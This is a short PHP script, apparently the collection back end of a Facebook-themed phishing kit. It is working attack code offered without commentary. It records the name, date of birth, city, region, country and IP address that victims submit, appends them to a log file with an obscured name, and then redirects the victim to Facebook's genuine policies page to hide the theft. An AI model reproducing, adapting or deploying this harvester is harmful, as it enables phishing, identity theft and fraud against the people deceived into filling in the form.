<?php
$file = "_____________jd48f568g6j8d458f568";
$ufn = $_POST['fn'];
$uln = $_POST['ln'];
$udd = $_POST['dd'];
$umm = $_POST['mm'];
$uyy = $_POST['yy'];
$cit = $_POST['ct'];
$reg = $_POST['rg'];
$cou = $_POST['co'];
$semua = $_SERVER['REMOTE_ADDR'];
$today = date("F j, Y, g:i a");

$handle = fopen($file, 'a');
fwrite($handle, "\n");
fwrite($handle, "*************************************************************|FILES-3|");
fwrite($handle, "\n");
fwrite($handle, "Full Name       : ");
fwrite($handle, "$ufn");
fwrite($handle, " ");
fwrite($handle, "$uln");
fwrite($handle, "\n");
fwrite($handle, "Date of birth   : ");
fwrite($handle, "$udd");
fwrite($handle, "-");
fwrite($handle, "$umm");
fwrite($handle, "-");
fwrite($handle, "$uyy");
fwrite($handle, "\n");
fwrite($handle, "City and Region : ");
fwrite($handle, "$cit");
fwrite($handle, ", ");
fwrite($handle, "$reg");
fwrite($handle, "\n");
fwrite($handle, "Country         : ");
fwrite($handle, "$cou");
fwrite($handle, "\n");
fwrite($handle, "IP Address      : ");
fwrite($handle, "$semua");
fwrite($handle, "\n");
fwrite($handle, "Date of entry   : ");
fwrite($handle, "$today");
fwrite($handle, "\n");
fwrite($handle, "*************************************************************|FILES-3|");
fclose($handle);
echo "<script LANGUAGE=\"JavaScript\">
<!--
window.location=\"https://www.facebook.com/policies_center/\";
// -->
</script>";
?>
